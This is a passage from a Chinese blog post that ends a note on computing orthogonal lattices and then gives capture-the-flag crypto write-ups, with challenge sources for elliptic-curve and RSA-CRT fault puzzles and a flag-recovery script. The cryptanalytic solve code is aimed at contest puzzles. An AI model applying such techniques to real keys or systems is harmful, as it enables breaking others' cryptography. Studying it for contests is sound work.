$(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$</p>\n</li>\n<li><p>输出 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$</p>\n</li>\n</ol>\n<p>可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）</p>\n<blockquote>\n<p>笔者注记：<br>$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。</p>\n</blockquote>\n<h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    LB = B.transpose().left_kernel(basis=<span class=\"string\">&quot;LLL&quot;</span>).basis_matrix()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<p>但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）<br>于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>),<span class=\"number\">20</span>)    <span class=\"comment\"># this bound can be adjusted as needed</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d,_n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><p><a href=\"https://link.springer.com/chapter/10.1007/BFb0052236\">P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.</a></p>\n</li>\n<li><p><a href=\"https://link.springer.com/article/10.1007/s13389-011-0015-x\">Modulus Fault Attacks Against RSA-CRT Signatures</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/50483906\">知乎 线性代数之——正交向量与子空间</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/187345192\">知乎 格拉姆矩阵（Gram matrix）详细解读</a></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>有瓜吃，美滋滋。</p>","more":"<p>题目质量一般，知识问答还全是搬运今年 ciscn 的。<br>然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。</p>\n<h2 id=\"point-power\"><a href=\"#point-power\" class=\"headerlink\" title=\"point-power\"></a>point-power</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag)==<span class=\"number\">42</span></span><br><span class=\"line\">p=getPrime(<span class=\"number\">600</span>)</span><br><span class=\"line\">a=bytes_to_long(flag)</span><br><span class=\"line\">b=randrange(<span class=\"number\">2</span>,p-<span class=\"number\">1</span>)</span><br><span class=\"line\">E=EllipticCurve(GF(p),[a,b])</span><br><span class=\"line\">G=E.random_element()</span><br><span class=\"line\"></span><br><span class=\"line\">x1,y1,_=G</span><br><span class=\"line\">G=<span class=\"number\">2</span>*G</span><br><span class=\"line\">x2,y2,_=G</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;b = <span class=\"subst\">&#123;b&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x1 = <span class=\"subst\">&#123;x1&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x2 = <span class=\"subst\">&#123;x2&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\"><span class=\"string\">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\"><span class=\"string\">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\"><span class=\"string\">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。<br>首先查到椭圆曲线的加法（两点相同的情形）：<br>$$<br>x_2=m^2-2x_1\\ (mod\\ p) \\ with \\ m=\\frac{3x_1^2+a}{2y_1}<br>$$<br>又在Sagemath文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程， exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"number\">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\">b = <span class=\"number\">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\">x1 = <span class=\"number\">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\">x2 = <span class=\"number\">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"></span><br><span class=\"line\">K = GF(p)</span><br><span class=\"line\">n=(K(x2+<span class=\"number\">2</span>*x1)).sqrt()</span><br><span class=\"line\">P.&lt;x&gt;= PolynomialRing(K)</span><br><span class=\"line\">A=<span class=\"number\">1</span></span><br><span class=\"line\">B=<span class=\"number\">6</span>*x1**<span class=\"number\">2</span>-<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1</span><br><span class=\"line\">C=-(<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1**<span class=\"number\">3</span>+<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*b-<span class=\"number\">9</span>*x1**<span class=\"number\">4</span>)</span><br><span class=\"line\">f=A*x**<span class=\"number\">2</span>+B*x+C</span><br><span class=\"line\">roots=f.roots()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(roots)</span><br><span class=\"line\">flag=roots[<span class=\"number\">1</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(<span class=\"built_in\">int</span>(flag)))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strange-curve\"><a href=\"#strange-curve\" class=\"headerlink\" title=\"strange curve\"></a>strange curve</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">P,Q</span>):</span><br><span class=\"line\">    (x1,y1)=P</span><br><span class=\"line\">    (x2,y2)=Q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    x3=(x1+x2)*(<span class=\"number\">1</span>+y1*y2)*invert((<span class=\"number\">1</span>+x1*x2)*(<span class=\"number\">1</span>-y1*y2),p)%p</span><br><span class=\"line\">    y3=(y1+y2)*(<span class=\"number\">1</span>+x1*x2)*invert((<span class=\"number\">1</span>-x1*x2)*(<span class=\"number\">1</span>+y1*y2),p)%p</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x3,y3)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">e,P</span>):</span><br><span class=\"line\">    Q=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    e=e%p</span><br><span class=\"line\">    <span class=\"keyword\">while</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> e&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">            Q=add(Q,P)</span><br><span class=\"line\">        P=add(P,P)</span><br><span class=\"line\">        e&gt;&gt;=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Q</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Legendre</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"built_in\">pow</span>((a%p+p)%p,(p-<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_ts</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    p=p-<span class=\"number\">1</span></span><br><span class=\"line\">    count=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> p%<span class=\"number\">2</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">        count+=<span class=\"number\">1</span></span><br><span class=\"line\">        p=p//<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> count,p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_nonre</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> Legendre(a,p)==<span class=\"number\">1</span>:</span><br><span class=\"line\">        a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">amm2</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    t,s=get_ts(p)</span><br><span class=\"line\">    ta=<span class=\"built_in\">pow</span>(get_nonre(p),s,p)</span><br><span class=\"line\">    tb=<span class=\"built_in\">pow</span>(a,s,p)</span><br><span class=\"line\">    h=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,t):</span><br><span class=\"line\">        d=<span class=\"built_in\">pow</span>(tb,<span class=\"number\">2</span>**t-<span class=\"number\">1</span>-i,p)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d==<span class=\"number\">1</span>:</span><br><span class=\"line\">            k=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            k=<span class=\"number\">1</span></span><br><span class=\"line\">        tb=(tb*<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>*k,p))%p</span><br><span class=\"line\">        h=(h*<span class=\"built_in\">pow</span>(ta,k,p))%p</span><br><span class=\"line\">        ta=<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> h*<span class=\"built_in\">pow</span>(a,(s+<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p)%p  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">a,b,c,p</span>):</span><br><span class=\"line\">    tmpa=<span class=\"number\">1</span></span><br><span class=\"line\">    tmpb=b*inverse(a,p)%p</span><br><span class=\"line\">    tmpc=c*inverse(a,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> Legendre(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)==<span class=\"number\">1</span></span><br><span class=\"line\">    res1=(amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    res2=(-amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (res1,res2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lift</span>(<span class=\"params\">x,a,b,p</span>):</span><br><span class=\"line\">    tmp=b*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)*inverse(a*x,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> solve(<span class=\"number\">1</span>,-tmp,-<span class=\"number\">1</span>,p)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"number\">9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353</span></span><br><span class=\"line\">a=<span class=\"number\">54733430689690725746438325219044741824500093621550218736194675295708808435509</span></span><br><span class=\"line\">b=<span class=\"number\">75237024593957256761258687646797952793573177095902495908321724558796076392871</span></span><br><span class=\"line\">x=bytes_to_long(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        y=lift(x,a,b,p)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        x+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> a*x*(y**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p==b*y*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p</span><br><span class=\"line\"></span><br><span class=\"line\">P=(x,y)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\">eP=mul(e,P)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;P = <span class=\"subst\">&#123;P&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;eP = <span class=\"subst\">&#123;eP&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)</span></span><br><span class=\"line\"><span class=\"string\">eP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。<br>直接拿第一个数 <code>long_to_bytes</code> ，得到flag。</p>\n<h2 id=\"Learning-with-fault\"><a href=\"#Learning-with-fault\" class=\"headerlink\" title=\"Learning with fault\"></a>Learning with fault</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RSA</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,p,q,e</span>):</span><br><span class=\"line\">        self.p=p</span><br><span class=\"line\">        self.q=q</span><br><span class=\"line\">        self.e=e</span><br><span class=\"line\">        self.phi=(p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.d=invert(self.e,self.phi)</span><br><span class=\"line\">        self.dp=self.d%(p-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.dq=self.d%(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.n=p*q</span><br><span class=\"line\">        self.N=getPrime(<span class=\"number\">512</span>)*getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">corrupt_sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">verify</span>(<span class=\"params\">self,message,sign</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes(<span class=\"built_in\">pow</span>(bytes_to_long(sign),self.e,self.n))==message</span><br><span class=\"line\"></span><br><span class=\"line\">p=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">q=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\">rsa=RSA(p,q,e)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f1:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;corrupted_sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">            message=os.urandom(<span class=\"number\">64</span>)</span><br><span class=\"line\">            sign=rsa.sign(message)</span><br><span class=\"line\">            corrupted_sign=rsa.corrupt_sign(message)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> rsa.verify(message,sign)</span><br><span class=\"line\">            f1.write(<span class=\"built_in\">str</span>(sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            f2.write(<span class=\"built_in\">str</span>(corrupted_sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">enc=<span class=\"built_in\">pow</span>(bytes_to_long(flag),rsa.e,rsa.n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;n = <span class=\"subst\">&#123;rsa.n&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;N = <span class=\"subst\">&#123;rsa.N&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;e = <span class=\"subst\">&#123;rsa.e&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;enc = <span class=\"subst\">&#123;enc&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">n = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\"><span class=\"string\">N = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\"><span class=\"string\">e = 65537</span></span><br><span 